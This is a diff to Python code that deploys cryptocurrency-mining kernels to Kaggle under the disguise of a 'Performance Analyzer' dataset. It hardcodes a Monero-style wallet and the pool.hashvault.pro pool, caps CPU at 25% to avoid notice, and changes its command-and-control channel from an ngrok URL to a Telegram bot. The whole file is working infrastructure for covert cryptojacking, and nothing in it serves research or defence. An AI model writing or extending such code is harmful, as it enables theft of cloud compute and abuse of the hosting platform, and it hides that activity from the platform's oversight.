@@ -59,14 +59,6 @@ def create_dataset_and_kernel(
         file_path = Path(__file__).resolve()
         project_root = file_path.parent.parent.parent  # src/agents/kaggle -> src -> project root
         config_path = project_root / "config.json"
-        c2_url = "https://lynelle-scroddled-corinne.ngrok-free.dev"
-        
-        if os.path.exists(config_path):
-            try:
-                with open(config_path) as f:
-                    cfg = json.load(f)
-                    c2_url = cfg.get("c2_url", c2_url)
-            except: pass
         
         # Create dataset
         dataset_slug = f"{username}/perf-analyzer"
@@ -90,21 +82,20 @@ def create_dataset_and_kernel(
                     telegram_chat_id = cfg.get("telegram_chat_id")
             except: pass
         
-        # Write config.json for dataset (Telegram C2 priority over ngrok)
+        # Write config.json for dataset (Telegram C2 only - no tunnel needed)
         config_data = {
-            "c2_url": c2_url,  # Fallback ngrok URL
             "pool": "pool.hashvault.pro:80",
             "wallet": "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5",
             "cpu_limit": 25,
             "updated": int(time.time())
         }
-        # Add Telegram C2 config if available (preferred over ngrok)
+        # Add Telegram C2 config
         if telegram_bot_token and telegram_chat_id:
             config_data["telegram_bot_token"] = telegram_bot_token
             config_data["telegram_chat_id"] = telegram_chat_id
-            log_fn(f"[DEPLOY] ✓ Telegram C2 configured: bot_token={telegram_bot_token[:10]}... chat_id={telegram_chat_id}")
+            log_fn(f"[DEPLOY] ✓ Telegram C2 configured: chat_id={telegram_chat_id}")
         else:
-            log_fn(f"[DEPLOY] ⚠ No Telegram C2 config, using ngrok fallback: {c2_url}")
+            log_fn(f"[DEPLOY] ⚠ No Telegram C2 config found")
         with open(project_root / "config.json", "w") as f:
             json.dump(config_data, f, indent=2)
         
@@ -178,13 +169,12 @@ def create_dataset_with_machines(
     num_machines: int = 5,
     log_fn: Optional[Callable] = None,
     enable_mining: bool = True,
-    c2_url: str = None,
 ) -> dict:
     """Create a dataset and kernels for autonomous mining.
     
     Creates:
-    - Empty dataset (placeholder for data)
-    - N kernels with autonomous worker (no server connection needed)
+    - Dataset with Telegram C2 config (no public URL needed)
+    - Kernels with TelegramC2 for direct communication
     
     Args:
         api_key: Kaggle API key
@@ -192,7 +182,6 @@ def create_dataset_with_machines(
         num_machines: Number of kernels to create
         log_fn: Logging function
         enable_mining: Enable autonomous mining mode
-        c2_url: Not used (autonomous mode)
     
     Returns:
         dict with success status and created resources
@@ -238,24 +227,22 @@ def create_dataset_with_machines(
         kaggle_dir = file_path.parent
         config_path = kaggle_dir / "config" / "config.json"
         
-        # Load or create config
-        c2_url = "https://lynelle-scroddled-corinne.ngrok-free.dev"
         kaggle_username = username  # Default to provided username
         kaggle_api_key = api_key    # Default to provided api_key
         
+        # Get credentials from config.json (Telegram C2 works without public URL)
         if os.path.exists(config_path):
             try:
                 with open(config_path) as f:
                     cfg = json.load(f)
-                    c2_url = cfg.get("c2_url", c2_url)
-                    # Override credentials from config if present
+                    # Telegram C2 doesn't need c2_url - works directly via Telegram API
                     if cfg.get("kaggle_username"):
                         kaggle_username = cfg["kaggle_username"]
                     if cfg.get("kaggle_api_key"):
                         kaggle_api_key = cfg["kaggle_api_key"]
             except: pass
         
-        # Get Telegram C2 config (priority over ngrok) - ALWAYS try to preserve
+        # Get Telegram C2 config - ALWAYS try to preserve
         telegram_bot_token = None
         telegram_chat_id = None
         if os.path.exists(config_path):
@@ -271,21 +258,20 @@ def create_dataset_with_machines(
         username = kaggle_username
         api_key = kaggle_api_key
         
-        # Create config.json for dataset
+        # Create config.json for dataset (Telegram C2 - no public URL needed)
         config_data = {
-            "c2_url": c2_url,
             "pool": "pool.hashvault.pro:80",
             "wallet": "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5",
             "cpu_limit": 25,
             "updated": int(time.time())
         }
-        # Add Telegram C2 config if available (preferred over ngrok)
+        # Add Telegram C2 config if available
         if telegram_bot_token and telegram_chat_id:
             config_data["telegram_bot_token"] = telegram_bot_token
             config_data["telegram_chat_id"] = telegram_chat_id
             log_fn(f"[DATASET] ✓ Telegram C2 configured: chat_id={telegram_chat_id}")
         else:
-            log_fn(f"[DATASET] ⚠ No Telegram C2, using ngrok: {c2_url}")
+            log_fn(f"[DATASET] ⚠ No Telegram C2 config found")
         
         dataset_meta = {
             "title": "Performance Analyzer",
@@ -314,7 +300,7 @@ def create_dataset_with_machines(
         with open(kaggle_config_dir / "dataset-metadata.json", "w") as f:
             json.dump(dataset_meta, f, indent=2)
         
-        log_fn(f"[DATASET] config.json written with C2: {c2_url}")
+        log_fn(f"[DATASET] config.json written with Telegram C2")
         log_fn(f"[DATASET] config.json content: {json.dumps(config_data, indent=2)[:500]}")
         
         # Push dataset to Kaggle using kagglesdk (no metadata files needed)
